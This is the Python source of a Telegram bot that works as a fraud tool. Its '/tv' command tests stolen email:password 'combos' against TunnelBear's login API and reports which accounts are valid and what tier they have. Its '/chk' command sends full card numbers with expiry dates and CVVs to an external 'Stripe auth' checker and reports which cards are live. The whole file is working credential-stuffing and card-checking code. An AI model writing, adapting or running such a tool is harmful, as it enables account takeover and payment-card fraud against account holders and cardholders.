import logging
import os
import requests
import time

from aiogram import Bot, Dispatcher, executor, types

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None)
URL = os.environ.get("URL", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def send_welcome(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "Hello how to use <code>/chk cc/mm/yy/cvv</code>"
    )
    

@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tv '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send ac /tv email|pass.</code>"
        )
    session = requests.session()
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    
    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ❌WRONG DETAILS
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""
<b>COMBO</b>➟ <code>{ac}</code>
<b>STATUS</b>➟ ✅VALID
<b>LEVEL</b>➟ {res['details']['bearType']}
<b>VALIDTILL</b>➟ {res['details']['fullVersionUntil']}
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""")
    else:
        await message.reply("Error❌: REQ failed")
        
    
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/chk '):]
    _bin = cc[0:10]
    if _bin in BLACKLISTED:
        return await message.reply(
            "<b>BLACKLISTED BIN</b>"
            )
    if not cc:
        return await message.reply(
            "<code>Send Card /chk cc|mm|yy|cvv.</code>"
        )   
    res = requests.get(
        f"{URL}/api.php/?lista={cc}"
    ).json()
    toc = time.perf_counter()
    INFO = f'''
<b>STRIPE AUTH</b>
CC ➟ <code>{cc}</code>
STATUS ➟ <b>{res["res"]}</b>
BRAND ➟ <b>{res["brand"]}</b>
BANK ➟ <b>{res["bank"]}</b>
COUNTRY ➟ <b>{res["country"]}</b>
TOOK ➟ <b>{toc - tic:0.4f}</b>(s)
<b>CHKBY</b> ➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
'''
    await message.reply(INFO)  
    
    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
